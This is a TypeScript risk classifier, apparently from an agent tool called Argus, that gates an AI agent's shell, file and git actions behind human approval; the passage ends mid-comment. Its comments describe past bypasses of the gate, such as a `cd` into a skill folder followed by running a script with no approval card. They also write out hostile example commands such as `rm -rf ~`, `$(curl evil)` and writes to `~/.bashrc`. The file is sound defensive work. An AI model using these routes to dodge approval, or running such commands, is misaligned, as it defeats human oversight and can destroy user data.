import path from 'node:path'
import type { Risk, SkillAssetContext } from '../../../shared/agent-events'
import { classifyToolName, type RiskLevel } from '../../../shared/connectors'
import { fillPrompt } from '../prompts/fill'
import type { PromptTextSpecs } from '../../../shared/promptSpec'

export type ToolTaxonomyEntry =
  | { kind: 'fs-read' | 'fs-write'; pathFields?: readonly string[] }
  | { kind: 'shell'; commandField: string }
  | { kind: 'network'; urlField: string }

export interface ToolTaxonomy {
  entries: Readonly<Record<string, ToolTaxonomyEntry>>
  /** Driver-declared fallback for its own long tail of non-MCP tools.
   *  Absent → unmapped names fail closed (HIGH ask). */
  fallback?: (toolName: string) => RiskVerdict
}

export interface RiskContext {
  caseDir: string
  workspaceRoots: string[]
  readonlyRoots: string[]
  /** Live overrides from config/tool-risk.json, keyed '<instanceId>/<toolName>'. */
  toolRisk?: Record<string, RiskLevel>
  /** Pack-declared CLI binary names (PackRegistry.binaryDecls), auto-allowlisted as LOW. */
  packCliNames?: string[]
  /** Per-command risk for pack panel commands, keyed by full tool name (3b-2). */
  panelCommandRisk?: Record<string, 'low' | 'medium' | 'high'>
  /** Driver-declared mapping from its native tool names to risk-relevant shape. */
  taxonomy: ToolTaxonomy
  /** Prompt-registry resolver for `RISK_DENY_REASONS`. Optional: callers without a store get
   *  the defaults. */
  resolve?: (id: string) => string
  /**
   * Resolve one shell segment to the skill asset it would execute, or null.
   *
   * Injected rather than imported: this module does no filesystem or database access and must
   * keep doing none — the gate needs both, and a classifier that reached for them could not be
   * unit-tested with a plain object. Absent means the gate is off, which is what every existing
   * caller and every driver-mapping test gets.
   *
   * `cwd` is what a RELATIVE token in the segment resolves against, and it is a parameter rather
   * than something the implementation closes over because it is not constant across one command:
   * `classifyToolCall` tracks it across the segments (`advanceCwd`). It used to be fixed at the
   * case directory, which made `cd <skillDir> && sh scripts/collect.sh` a total bypass — see
   * `advanceCwd`. A resolver that ignores this argument is back to the defect.
   */
  skillAsset?: (segment: string, cwd: string) => SkillAssetContext | null
}

export type RiskVerdict =
  | { action: 'allow'; risk: Risk }
  | {
      action: 'ask'
      risk: Risk
      grantKey: string | null
      reason: string
      /** Set only by the skill-asset gate. `session.ts` forwards it onto `request.opened`;
       *  it is the only channel by which the card learns anything about the script, since
       *  `reason` does not reach the card (see the comment above `NATIVE_RISK`). */
      assetContext?: SkillAssetContext
    }
  | { action: 'deny'; risk: Risk; reason: string }

/**
 * The only risk text that reaches the model. `session.ts` forwards `verdict.reason` as the
 * tool_result on a DENY. On an ASK, `verdict.reason` does NOT reach the approval card — the
 * card is built from `{requestId, tool, risk, grantKey, argsPreview}` plus, for a skill-asset
 * ask, `assetContext` (session.ts's `handleToolRequest`), and a refusal sends
 * `outcome.comment ?? 'Denied by user'` back to the model instead. An ASK's `reason` is logged
 * to the audit trail (`logToolCall`) but otherwise unused, so these are deliberately not
 * registered as user-facing copy.
 */
export const RISK_DENY_REASONS: PromptTextSpecs = {
  'risk.path-outside-sandbox': {
    title: 'Denied — path outside the sandbox',
    text: 'Path outside sandbox: {path}',
    placeholders: ['path']
  },
  'risk.readonly-root': {
    title: 'Denied — write under a read-only root',
    text: 'Read-only root: {path}',
    placeholders: ['path']
  }
}

/** Resolve one deny reason and fill in the offending path. No resolver = the default. */
function denyReason(ctx: RiskContext, key: string, pathValue: string): string {
  const text = ctx.resolve ? ctx.resolve(`tool-feedback.${key}`) : RISK_DENY_REASONS[key].text
  return fillPrompt(text, { path: pathValue })
}

/** Canonical Argus native-tool risk verdicts (keyed by `mcp__argus__<name>`). Exported so
 *  drivers can decide per-tool permission gating: a driver may bypass its SDK permission
 *  channel (Copilot `skipPermission`) for tools whose action is 'allow' (LOW), exactly as
 *  Claude auto-allows them. */
export const NATIVE_RISK: Record<string, RiskVerdict> = {
  mcp__argus__search_evidence: { action: 'allow', risk: 'LOW' },
  mcp__argus__search_case_history: { action: 'allow', risk: 'LOW' },
  mcp__argus__search_known_defects: { action: 'allow', risk: 'LOW' },
  mcp__argus__list_evidence: { action: 'allow', risk: 'LOW' },
  mcp__argus__get_artifact_meta: { action: 'allow', risk: 'LOW' },
  mcp__argus__read_lines: { action: 'allow', risk: 'LOW' },
  mcp__argus__grep_lines: { action: 'allow', risk: 'LOW' },
  mcp__argus__ingest_artifact: { action: 'allow', risk: 'LOW' },
  mcp__argus__append_finding: { action: 'allow', risk: 'LOW' },
  mcp__argus__read_memory: { action: 'allow', risk: 'LOW' },
  // NOT sandboxed: the PTC child is a plain ELECTRON_RUN_AS_NODE process (env-scrubbed, but
  // otherwise full user-level fs/network access) — the script's own code runs unsandboxed as
  // the user. Measured against a packaged build 2026-08-18: the child read and wrote the user's
  // home directory and opened an arbitrary socket. What IS restricted are the inner TOOL calls
  // the script can make: the PTC server allowlist limits it to the read-only
  // PTC_FOREGROUND_TOOLS set, and each is individually risk-checked when dispatched.
  //
  // So the script BODY has the reach of a shell command, and Argus classifies `Bash` per
  // command — this must not be quieter than that. `grantKey: null` is the load-bearing half:
  // a session grant would make approving one script silently approve every later one, and
  // unlike a shell command with a stable shape, every script body is a different program.
  //
  // Applies to interactive sessions only. The background distiller reaches this tool through
  // its own canUseTool whitelist (DISTILL_ALLOWED_TOOLS), which never consults this table —
  // gating here does not stall a headless run.
  mcp__argus__run_tool_script: {
    action: 'ask',
    risk: 'HIGH',
    grantKey: null,
    reason: 'Runs a model-authored script on your machine, unsandboxed and as you'
  },
  // Inert until accepted on the Proposals page (spec §2.4) — writing a proposal steers nothing.
  mcp__argus__write_proposal: { action: 'allow', risk: 'LOW' },
  // A read: pulls a CI job log into evidence. Spec §8 — "reads (fetch PR/CI/diff/logs) auto-run
  // and are logged". Ingesting is a local write, but of content the user already has access to
  // and asked for; the HITL bar is for writes that leave the machine.
  mcp__argus__fetch_check_logs: { action: 'allow', risk: 'LOW' },
  mcp__argus__open_panel: { action: 'allow', risk: 'LOW' },
  mcp__argus__capture_panel: { action: 'allow', risk: 'LOW' },
  // Inert until a human accepts it in the Home inbox (spec §5.3): the suggestion is written to
  // routine_run_items, never to the case. Same rationale as write_proposal above. WITHOUT this
  // entry it falls to the taxonomy fallback, which reads it as write-capable and ASKS — and an
  // unattended routine turn denies every ask, so the one tool the item loop exists to call is
  // denied on every item, always.
  mcp__argus__propose_case_triage: { action: 'allow', risk: 'LOW' },
  mcp__argus__update_case_status: {
    action: 'ask',
    risk: 'MEDIUM',
    grantKey: null,
    reason: 'Case lifecycle change'
  },
  mcp__argus__workspace_checkout: {
    action: 'ask',
    risk: 'MEDIUM',
    grantKey: 'ws:workspace_checkout',
    reason: 'Materialize a case worktree at a specific ref'
  },
  mcp__argus__write_memory: {
    action: 'ask',
    risk: 'MEDIUM',
    grantKey: null,
    reason: "Replace an agent-memory topic's whole body (steers all future sessions)"
  },
  mcp__argus__post_review_comment: {
    action: 'ask',
    risk: 'MEDIUM',
    grantKey: null,
    reason: 'Post a comment on a pull request'
  },
  mcp__argus__push_review_change: {
    action: 'ask',
    risk: 'HIGH',
    grantKey: null,
    reason: 'Remote mutation: push a commit to the pull request branch'
  }
}

const FS_PATH_FIELDS = ['file_path', 'path', 'notebook_path'] as const

export const CLAUDE_TOOL_TAXONOMY: ToolTaxonomy = {
  entries: {
    Read: { kind: 'fs-read', pathFields: FS_PATH_FIELDS },
    Glob: { kind: 'fs-read', pathFields: FS_PATH_FIELDS },
    Grep: { kind: 'fs-read', pathFields: FS_PATH_FIELDS },
    NotebookRead: { kind: 'fs-read', pathFields: FS_PATH_FIELDS },
    Write: { kind: 'fs-write', pathFields: FS_PATH_FIELDS },
    Edit: { kind: 'fs-write', pathFields: FS_PATH_FIELDS },
    NotebookEdit: { kind: 'fs-write', pathFields: FS_PATH_FIELDS },
    Bash: { kind: 'shell', commandField: 'command' }
  },
  // The pre-taxonomy legacy heuristic, relocated verbatim — Claude's built-in long
  // tail (TodoWrite, WebFetch, Task, …) keeps today's classification exactly.
  fallback: (toolName) => {
    const last = toolName.split('__').pop() ?? toolName
    if (/(delete|remove|transition|merge)/.test(last))
      return {
        action: 'ask',
        risk: 'HIGH',
        grantKey: null,
        reason: `Destructive tool: ${toolName}`
      }
    if (/^(get|list|read|search|view|find|check)(_|$)/.test(last))
      return { action: 'allow', risk: 'LOW' }
    return {
      action: 'ask',
      risk: 'MEDIUM',
      grantKey: `medium:${toolName}`,
      reason: `Write-capable tool: ${toolName}`
    }
  }
}

const GIT_READ = new Set([
  'log',
  'show',
  'diff',
  'blame',
  'status',
  'grep',
  'rev-parse',
  'ls-files',
  'remote',
  'branch',
  'describe',
  'shortlog'
])
const GIT_WS_MUT = new Set([
  'fetch',
  'pull',
  'switch',
  'checkout',
  'stash',
  'worktree',
  'reset',
  'restore',
  'clean'
])
const GH_READ = new Set(['view', 'list', 'diff', 'status', 'checks'])

function withinAny(p: string, roots: string[]): boolean {
  const abs = path.resolve(p)
  return roots.some((r) => abs === path.resolve(r) || abs.startsWith(path.resolve(r) + path.sep))
}

function inSandbox(p: string, ctx: RiskContext): boolean {
  // KNOWN, recorded rather than fixed. On Windows the agent's shell is git-bash, whose absolute
  // paths are spelled `/c/Users/…`; `~/…` is the same story on every platform. `path.resolve` in
  // `withinAny` reads that leading `/` as "root of the current drive" and turns it into
  // `C:\c\Users\…` (and leaves `~` as a literal directory name), so a path INSIDE the case
  // directory written either way sits outside every sandbox root. This function is BOTH the `cd`
  // check and the fs-read/fs-write sandbox check below, so what gets denied is `cd /c/<caseDir>`
  // AND every fs-tool path field spelled that way — `read_file "/c/<caseDir>/evidence/x.log"` is
  // refused just as flatly.
  // This is the mirror image of the skill-asset gate defect fixed in `skillAssetGate.ts`
  // (`msysAltPathFor`, `tildeAltPath`) — but it errs the conservative way (a false deny, never a
  // false allow), and it predates that work, so widening MSYS/tilde handling to all FS
  // classification here is left for a change that can cover every path field at once.
  return withinAny(p, [ctx.caseDir, ...ctx.workspaceRoots, ...ctx.readonlyRoots])
}

function classifyGit(tokens: string[]): RiskVerdict {
  // skip global flags/-C <path> to find the subcommand
  let i = 1
  let repo = 'cwd'
  while (i < tokens.length) {
    if (tokens[i] === '-C' && tokens[i + 1]) {
      repo = tokens[i + 1]
      i += 2
    } else if (tokens[i].startsWith('-')) i++
    else break
  }
  const sub = tokens[i] ?? ''
  if (sub === 'push')
    return { action: 'ask', risk: 'HIGH', grantKey: null, reason: 'Remote mutation: git push' }
  if (GIT_WS_MUT.has(sub))
    return {
      action: 'ask',
      risk: 'MEDIUM',
      grantKey: `ws:${repo}`,
      reason: `Workspace mutation: git ${sub}`
    }
  if (GIT_READ.has(sub)) return { action: 'allow', risk: 'LOW' }
  return {
    action: 'ask',
    risk: 'MEDIUM',
    grantKey: `ws:${repo}`,
    reason: `Unrecognized git subcommand: ${sub}`
  }
}

function classifyGh(tokens: string[]): RiskVerdict {
  const [, group, sub] = tokens
  if (group === 'auth' && sub === 'status') return { action: 'allow', risk: 'LOW' }
  if (group === 'api') {
    const hasMutMethod = tokens.some(
      (t, i) =>
        (t === '-X' || t === '--method') && /^(POST|PUT|PATCH|DELETE)$/i.test(tokens[i + 1] ?? '')
    )
    return hasMutMethod
      ? { action: 'ask', risk: 'HIGH', grantKey: null, reason: 'Remote mutation: gh api non-GET' }
      : { action: 'allow', risk: 'LOW' }
  }
  // Every `gh search <repos|issues|prs|commits|code>` subcommand is read-only. Matched on
  // the group, not GH_READ: GH_READ is tested against `sub`, and here `search` is the
  // group ("gh search prs"), so a GH_READ entry would never fire for it.
  if (group === 'search') return { action: 'allow', risk: 'LOW' }
  if (group === 'pr' && sub === 'checkout')
    return {
      action: 'ask',
      risk: 'MEDIUM',
      grantKey: 'ws:cwd',
      reason: 'Workspace mutation: gh pr checkout'
    }
  if (GH_READ.has(sub)) return { action: 'allow', risk: 'LOW' }
  return {
    action: 'ask',
    risk: 'HIGH',
    grantKey: null,
    reason: `Remote mutation: gh ${group} ${sub ?? ''}`.trim()
  }
}

/**
 * Splits a shell segment into whitespace tokens, dropping leading `VAR=value` assignments.
 *
 * Shared between the risk classifier and the skill-asset run gate (`skillAssetGate.ts`)
 * deliberately: two different splits would disagree about which token is the program exactly
 * once, and a mismatch there would let a script the gate should have caught run unreviewed, or
 * flag a token the classifier never treated as the program.
 */
export function shellSegmentTokens(segment: string): string[] {
  const tokens = segment.trim().split(/\s+/).filter(Boolean)
  while (tokens.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(tokens[0])) tokens.shift()
  return tokens
}

/**
 * Does this command open a heredoc? If it does, its NEWLINES are not statement separators.
 *
 * The marker is `<<` — neither preceded nor followed by a third `<` — plus an optional `-`,
 * optional whitespace, an optional quote or backslash, and then a letter or underscore. That
 * accepts every heredoc form a shell writes (`<<EOF`, `<<-EOF`, `<< EOF`, `<<'EOF'`, `<<"EOF"`,
 * `<<\EOF`) while excluding two things that are not heredocs and must keep their newline split:
 *   - `<<<`, the here-STRING. It has no body and lives on one line. Both guards are needed: the
 *     `(?!<)` rejects a match starting at the first `<`, the `(?<!<)` one starting at the second.
 *   - An arithmetic left shift with a numeric operand, `$((1<<3))` — the digit is not `[A-Za-z_]`.
 * Chosen over a bare `<<` test deliberately: a bare test would read both of those as heredocs and
 * withhold the newline split from an ordinary multi-line command, which is a MISSED card. The
 * residual cost runs the other way and is only noise: a delimiter starting with a digit
 * (`<<1EOF` — legal, never seen) or a shift by a NAMED variable (`$((1<<n))`) is misjudged, and
 * misjudging it produces at worst a spurious ask.
 */
const HEREDOC_OPEN = /(?<!<)<<(?!<)-?[ \t]*["'\\]?[A-Za-z_]/

/**
 * The statement separators of one command, in the order a shell reads them.
 *
 * A NEWLINE is a separator exactly as `&&`, `;` and `|` are — the Bash tool takes ONE command
 * string and models write multi-line commands routinely, so `cd <skillDir>\nsh scripts/collect.sh`
 * is at least as natural as the `&&` spelling that a live run (2026-08-20) executed ungated. Until
 * this split existed both statements landed in ONE segment: only the first was ever classified,
 * and `advanceCwd` runs AFTER a segment is classified, so the `cd` never applied to the token
 * beside it. That reopened the skill-asset bypass, and it left an older hole in the ordinary
 * classifier — `echo hi\nrm -rf ~` came back allow/LOW, because only `echo` was ever seen.
 *
 * The heredoc carve-out is a human decision. Inside `cat <<'EOF' … EOF` the lines are DATA, not
 * statements, and splitting them raises a spurious "Recursive delete" ask for an `rm -rf` that the
 * shell only ever writes into a file. Over-asking on legitimate commands trains exactly the
 * click-through reflex this gate exists to prevent, so a heredoc-bearing command keeps every other
 * separator and loses only the newline.
 *
 * RESIDUAL, and it is a missing-card direction: because the carve-out is per COMMAND rather than
 * per line, a `cd` and a script invocation spread across lines of a command that ALSO carries a
 * heredoc anywhere in it stay invisible. Narrowing it would mean tracking heredoc bodies line by
 * line, which is a parser, not a split.
 */
function shellSegments(command: string): string[] {
  return command.split(HEREDOC_OPEN.test(command) ? /&&|\|\||;|\|/ : /&&|\|\||;|\||\r?\n/)
}

/** The three §7.2 states differ only in what the card says; action and risk are identical. */
function assetReason(a: SkillAssetContext): string {
  const what = `Runs ${a.relPath} from the "${a.skill}" skill`
  if (a.reviewState === 'reviewed') return `${what} — reviewed on this machine`
  if (a.reviewState === 'changed') return `${what} — CHANGED since you reviewed it`
  return `${what} — never reviewed here`
}

/**
 * The session grant key for a segment that runs a skill script.
 *
 * TWO digests, not one. The content hash kills the grant the instant the bytes change —
 * including mid-session after a HiveMind pull. The segment digest scopes it to this exact
 * command line, so approving `sh collect.sh` grants nothing to `sh collect.sh --purge /`,
 * `sh collect.sh > ~/.bashrc`, or `sh collect.sh $(curl evil)`. That matters more than it looks:
 * the asset verdict REPLACES the ordinary classification for its segment, so whatever the
 * classifier would have said about those extra tokens never runs either.
 *
 * A key at all, rather than `null`: re-prompting on every iteration of a loop that calls the
 * same script ten times trains exactly the click-through reflex this gate exists to prevent.
 * An identical command re-issued still rides the grant; anything else re-prompts.
 *
 * Two callers narrow it further and neither is optional. `classifySegment` refuses a key when
 * the segment's ORDINARY verdict was a grantless ask, and `classifyToolCall` refuses one for
 * any command with more than one meaningful segment — see both for why.
 *
 * DEVIATION from the plan's Global Constraints, which state the format as
 * `skill-asset:${hash.slice(0, 16)}` (the script alone). A human decided to narrow it after
 * final review found the hash-only key covered arbitrary arguments and redirections.
 */
function assetGrantKey(asset: SkillAssetContext): string {
  return `skill-asset:${asset.hash.slice(0, 16)}:${asset.segmentKey.slice(0, 16)}`
}

/**
 * Classify one segment, with the skill-asset gate layered over the ordinary classification.
 *
 * Order matters, and it is deny-first. The gate scans EVERY token in the segment, so a segment
 * that both leaves the sandbox and mentions a skill script — `cd /outside <skill script>` — used
 * to come back as a HIGH ask because the gate returned before the `cd` deny was ever reached.
 * More generally: any deny rule added to `classifyPlainSegment` below would be silently
 * unreachable for asset-bearing segments. A gate that can WEAKEN an existing deny is pointed the
 * wrong way, so the base classification runs first and a deny wins outright.
 *
 * Running the base path always is free — it is string-only, no filesystem, no database — and it
 * runs before `ctx.skillAsset`, so a denied segment does not pay for the gate's syscalls at all.
 *
 * With `baseWasGrantless` below, the gate can only ever STRENGTHEN a verdict, on all three
 * dimensions: a deny stays a deny, HIGH is the top risk, and a base ask the classifier
 * deliberately refused to make grantable stays ungrantable. That last one is not decoration —
 * `rm -rf <skill script>` and `gh api -X POST … --input <skill script>` both name an asset, and
 * before the fix the gate handed each of them a session-grantable key that the classifier had
 * explicitly set to `null`, turning a never-grant verdict into a grantable one.
 */
function classifySegment(segment: string, ctx: RiskContext, cwd: string): RiskVerdict {
  const base = classifyPlainSegment(segment, ctx)
  if (base.action === 'deny') return base
  // The gate sits above the program-name dispatch: what matters is the FILE a segment executes,
  // not whether the program is `bash`, `sh`, `python`, or the script itself. A gate, not a
  // sandbox (spec §7.4) — see `skillAssetContextForSegment` for the full list of what it cannot
  // see (command substitution, stdin-fed interpreters, `sh -c "…"`, paths containing a space);
  // all of those fall back to the ordinary classification computed above.
  const asset = ctx.skillAsset?.(segment, cwd)
  if (!asset) return base
  const baseWasGrantless = base.action === 'ask' && base.grantKey === null
  return {
    action: 'ask',
    risk: 'HIGH',
    grantKey: baseWasGrantless ? null : assetGrantKey(asset),
    // The asset half leads: the card's copy comes from `assetContext`, not from here, so this
    // only shapes the audit line — and an audit line reading only "runs a reviewed script" for
    // a `gh api -X POST` mislabels a remote mutation. Keep both facts, script first.
    reason: base.action === 'ask' ? `${assetReason(asset)} — ${base.reason}` : assetReason(asset),
    assetContext: asset
  }
}

function classifyPlainSegment(segment: string, ctx: RiskContext): RiskVerdict {
  const tokens = shellSegmentTokens(segment)
  if (tokens.length === 0) return { action: 'allow', risk: 'LOW' }
  const prog = path.basename(tokens[0])

  if (prog === 'git') return classifyGit(tokens)
  if (prog === 'gh') return classifyGh(tokens)
  if (prog === 'rm' && tokens.some((t) => /^-[a-zA-Z]*r/i.test(t) || t === '--recursive'))
    return { action: 'ask', risk: 'HIGH', grantKey: null, reason: 'Recursive delete' }
  if (prog === 'cd') {
    const target = tokens[1]
    if (target && path.isAbsolute(target) && !inSandbox(target, ctx))
      return {
        action: 'deny',
        risk: 'HIGH',
        reason: denyReason(ctx, 'risk.path-outside-sandbox', target)
      }
    return { action: 'allow', risk: 'LOW' }
  }
  // Builtin classifiers above always win; the pack allowlist only applies to CLIs that
  // don't collide with git/gh/rm/cd (enforced at the manifest schema level too).
  if (ctx.packCliNames?.includes(prog)) return { action: 'allow', risk: 'LOW' }
  if (['grep', 'rg', 'cat', 'awk', 'sed', 'head', 'tail'].includes(prog)) {
    const touchesEvidence = tokens
      .slice(1)
      .some((t) => t.startsWith('evidence/') || t.includes('/evidence/'))
    if (touchesEvidence)
      return {
        action: 'ask',
        risk: 'MEDIUM',
        grantKey: null,
        reason: ctx.packCliNames?.length
          ? `Use the pack analysis CLIs (${ctx.packCliNames.join(', ')}) for evidence files instead of raw text tools`
          : 'Raw text tools are discouraged on evidence files — they have no guardrails or output caps'
      }
  }
  // absolute-path writes/reads are governed by the FS sandbox for FS tools; for bash we
  // only police cd/rm; everything else defaults LOW inside the session cwd.
  return { action: 'allow', risk: 'LOW' }
}

/**
 * What one segment does to the shell's working directory.
 *
 * `none` covers "not a cd" AND every cd shape deliberately left unmodelled — both leave the
 * running cwd where it was, which is what the classifier did for every segment before this
 * existed.
 */
type CdMove =
  { kind: 'none' } | { kind: 'home' } | { kind: 'back' } | { kind: 'to'; target: string }

/**
 * The home directory, spelled as a path SEGMENT rather than resolved.
 *
 * This module may not read `os.homedir()` — it is pure string math over the command text, and the
 * home directory is a fact about the machine. It does not have to: `path.resolve(cwd, '~')` leaves
 * a literal `~` segment in the running cwd, and the far side of the injection seam
 * (`skillAssetGate.ts`'s `tildeAltPath`) already expands a `~` segment wherever it sits, because
 * the model writing `sh ~/Argus/…` produces exactly the same shape. So `cd ~ && sh x/y.sh`
 * composes with the tilde handling already in place instead of duplicating it here.
 *
 * That far-side rule — a segment spelled EXACTLY `~`, wherever in the path it sits — is the UNIQUE
 * rule satisfying both callers, so do not "clean it up" in either direction. Narrowing it to a
 * LEADING `~` breaks this composition: `path.resolve(cwd, '~')` puts the tilde in the middle
 * (`<caseDir>/~`), so there is no leading `~` left to anchor on. Widening it to "contains a `~`"
 * breaks Windows 8.3 short names — `PROGRA~1` is an ordinary directory, not a home reference.
 * `skillAssetGate.segment.test.ts` asserts the composition end to end so a narrowing cannot pass.
 */
const HOME_SEGMENT = '~'

/**
 * Shell syntax that can sit in front of a `cd` without changing what it does to the cwd of the
 * segments that follow in the same command string.
 *
 * `{` is here and `(` is handled separately because `(` glues to the next word (`(cd x`).
 *
 * A subshell `( cd x && … )` genuinely restores the cwd when it CLOSES, and this does not model
 * that — the tracked cwd stays moved for the rest of the command. That direction is a possibly
 * SPURIOUS card, not a missed one, and the shapes below are exactly the ones an agent reaches for
 * (`( cd <skillDir> && sh <rel> )`, `for …; do cd <skillDir> && sh <rel>; done`), both of which
 * bypassed the gate entirely while `tokens[0]` had to be `cd` on the nose.
 */
const CD_LEADING_SYNTAX = new Set(['do', 'then', 'else', '{'])

/**
 * The tokens of a segment with any leading grouping syntax stripped, so `( cd x`, `(cd x` and
 * `do cd x` all reach `cdMove` below as `cd x`.
 */
function cdTokens(segment: string): string[] {
  const tokens = shellSegmentTokens(segment)
  while (tokens.length > 0) {
    const first = tokens[0]
    if (first.startsWith('(')) {
      const rest = first.replace(/^\(+/, '')
      tokens.shift()
      if (rest !== '') tokens.unshift(rest)
      continue
    }
    if (CD_LEADING_SYNTAX.has(first)) {
      tokens.shift()
      continue
    }
    break
  }
  return tokens
}

/**
 * What the `cd` in a segment (if any) moves to.
 *
 * The program token must be `cd`, EXACTLY — not `path.basename`, which the classifier above uses.
 * Only the shell builtin changes the shell's directory; `/usr/bin/cd` is a separate process whose
 * chdir dies with it. Following a path-spelled `cd` would point the gate at a directory the shell
 * never entered, and a wrong base directory is a MISSED approval card — the failure mode this
 * whole mechanism exists to close. (The classifier's `cd` DENY is basename-matched and stays that
 * way: an over-broad deny is the safe direction, an over-broad base is not.)
 *
 * `cdTokens` first drops leading grouping syntax, which is the only relaxation. Everything else
 * still returns `none` — `pushd`/`popd`, `cd "$VAR"`, `cd $(…)`, `cd ~user`, a target containing a
 * space. Read that list as NOT YET SEEN rather than improbable: `cd <skillDir> && sh <rel>` sat on
 * the "unlikely" list right up until a live run executed it and ran a script with no card.
 */
function cdMove(segment: string): CdMove {
  const tokens = cdTokens(segment)
  if (tokens[0] !== 'cd') return { kind: 'none' }
  for (const raw of tokens.slice(1)) {
    if (raw === '--') continue
    // `-` alone is the OLDPWD form, not an option.
    if (raw === '-') return { kind: 'back' }
    if (raw.startsWith('-')) continue // -L, -P, -e, -@
    const target = raw.replace(/^(["'])(.*)\1$/, '$2')
    // A quote left over after stripping a MATCHED pair means the target contained whitespace and
    // `shellSegmentTokens` already tore it in half (a documented limit of the shared tokenizer —
    // see `skillAssetContextForSegment`). Advancing to the first fragment would name a directory
    // the command never did, so stay put.
    if (/^["']|["']$/.test(target)) return { kind: 'none' }
    if (target === '') return { kind: 'none' }
    return { kind: 'to', target }
  }
  // `cd` with no operand: the shell goes to $HOME.
  return { kind: 'home' }
}

/**
 * The running cwd after one segment, plus the one it came from.
 *
 * WHY THIS EXISTS. `skillAsset` resolves relative tokens against a base directory, and that base
 * used to be the case directory for every segment of every command. A live CDP run (2026-08-20)
 * executed `cd "<caseDir>/.claude/skills/collect-logs" && sh scripts/collect.sh` and the gate saw
 * nothing at all: `scripts/collect.sh` resolved to `<caseDir>/scripts/collect.sh`, which does not
 * exist, and the only other token was the skill DIRECTORY, which `skillAssetAt` refuses on purpose
 * (a directory is not a file inside a skill). Both candidates missed, the segment fell through to
 * a LOW allow, and an unreviewed script ran with no approval card — `Bash / LOW / auto`.
 *
 * That is a different failure mode from the `/c/…` and `~/…` bypasses fixed before it. Those were
 * SPELLING misses: a token `path.resolve` could not parse. Here every token parsed fine and was
 * resolved against the wrong BASE. Worse, it is the shape the tooling teaches — a SKILL.md says
 * "run `scripts/collect.sh`" and the SDK announces the skill's base directory — so it is plausibly
 * the most common real invocation there is.
 *
 * Pure string math, deliberately: no `fs`, no `node:sqlite`, no `crypto`. In particular the `cd`
 * target is NOT checked for existence. Whether a directory exists is a filesystem question and it
 * belongs on the far side of the injection seam, where a non-existent base simply resolves to
 * nothing and reports no asset.
 *
 * `prev` is tracked only for `cd -`. It seeds equal to the starting cwd, so a leading `cd -`
 * (whose real OLDPWD the classifier cannot know) is a no-op rather than a guess.
 */
function advanceCwd(cwd: string, prev: string, segment: string): { cwd: string; prev: string } {
  const move = cdMove(segment)
  if (move.kind === 'none') return { cwd, prev }
  if (move.kind === 'back') return { cwd: prev, prev: cwd }
  const target = move.kind === 'home' ? HOME_SEGMENT : move.target
  return { cwd: path.resolve(cwd, target), prev: cwd }
}

const RISK_ORDER: Risk[] = ['LOW', 'MEDIUM', 'HIGH']

/**
 * Is `v` a worse verdict than the running worst? The first two rules are the original merge,
 * verbatim: higher risk wins, and an ask beats an allow even at lower risk. The third is new —
 * at equal risk, a verdict carrying asset context beats one without, because losing it would
 * show a reviewer a script's approval prompt with no script in it.
 */
function isWorse(v: RiskVerdict, worst: RiskVerdict): boolean {
  if (RISK_ORDER.indexOf(v.risk) > RISK_ORDER.indexOf(worst.risk)) return true
  if (v.action === 'ask' && worst.action === 'allow') return true
  if (RISK_ORDER.indexOf(v.risk) !== RISK_ORDER.indexOf(worst.risk)) return false
  return (
    v.action === 'ask' &&
    worst.action === 'ask' &&
    v.assetContext !== undefined &&
    worst.assetContext === undefined
  )
}

export function classifyToolCall(
  toolName: string,
  input: Record<string, unknown>,
  ctx: RiskContext
): RiskVerdict {
  const native = NATIVE_RISK[toolName]
  if (native) return native

  const pcRisk = ctx.panelCommandRisk?.[toolName]
  if (pcRisk) {
    if (pcRisk === 'low') return { action: 'allow', risk: 'LOW' }
    if (pcRisk === 'high')
      return { action: 'ask', risk: 'HIGH', grantKey: null, reason: `Panel command: ${toolName}` }
    return {
      action: 'ask',
      risk: 'MEDIUM',
      grantKey: `medium:${toolName}`,
      reason: `Panel command: ${toolName}`
    }
  }

  const tax = ctx.taxonomy.entries[toolName]
  if (tax && (tax.kind === 'fs-read' || tax.kind === 'fs-write')) {
    const fields = tax.pathFields ?? FS_PATH_FIELDS
    const p = fields.map((f) => input[f]).find((v) => typeof v === 'string') as string | undefined
    // The agent session's cwd is always ctx.caseDir, so a missing or relative path
    // resolves against it. A missing path means "cwd" -> caseDir -> allowed.
    const abs = p ? path.resolve(ctx.caseDir, p) : ctx.caseDir
    if (!inSandbox(abs, ctx))
      return {
        action: 'deny',
        risk: 'HIGH',
        reason: denyReason(ctx, 'risk.path-outside-sandbox', p ?? abs)
      }
    if (tax.kind === 'fs-write' && withinAny(abs, ctx.readonlyRoots))
      return {
        action: 'deny',
        risk: 'HIGH',
        reason: denyReason(ctx, 'risk.readonly-root', p ?? abs)
      }
    return { action: 'allow', risk: 'LOW' }
  }

  if (tax && tax.kind === 'shell') {
    const command = String(input[tax.commandField] ?? '')
    const segments = shellSegments(command)
    // Empty segments do not count: a trailing `;` or `|` splits into two, and treating
    // `sh collect.sh;` as a chained command would strip the key off an ordinary one-command
    // invocation — killing the loop ergonomics `assetGrantKey` exists for, for a stray separator.
    const meaningful = segments.filter((s) => s.trim() !== '')
    let worst: RiskVerdict = { action: 'allow', risk: 'LOW' }
    // Every DISTINCT script the command runs, in order — used only to word the reason below.
    const assets: SkillAssetContext[] = []
    // The shell's working directory as of each segment. Seeded at the case directory, which is
    // where the agent's shell starts, and advanced by any `cd` — see `advanceCwd` for the bypass
    // this closes. `prevCwd` exists only to answer `cd -`.
    let cwd = ctx.caseDir
    let prevCwd = ctx.caseDir
    for (const seg of segments) {
      const v = classifySegment(seg, ctx, cwd)
      if (v.action === 'deny') return v
      if (
        v.action === 'ask' &&
        v.assetContext &&
        !assets.some((a) => a.hash === v.assetContext!.hash)
      )
        assets.push(v.assetContext)
      if (isWorse(v, worst)) worst = v
      // AFTER the deny return, so a denied `cd` never moves the cwd. Moot in practice — the loop
      // returns on the first deny and never reaches a later segment — but writing it this way
      // means the question stays answered if the early return is ever softened.
      const next = advanceCwd(cwd, prevCwd, seg)
      cwd = next.cwd
      prevCwd = next.prev
    }
    // The grant key is computed per SEGMENT but applied to the WHOLE command, so a chained
    // command must not carry one at all. `isWorse` prefers an asset ask over a plain ask of
    // equal risk (so the card always has a script in it), which means the winning verdict is
    // the FIRST asset segment's — identical, key included, to what a bare `sh collect.sh`
    // produces. Without this block, one "approve for session" on the benign form silently
    // auto-allows `sh collect.sh && rm -rf ~`, `&& git push`, `&& sh collect.sh --purge /`,
    // `| tee ~/.bashrc` — with no card, and an audit line naming only the script. Against main
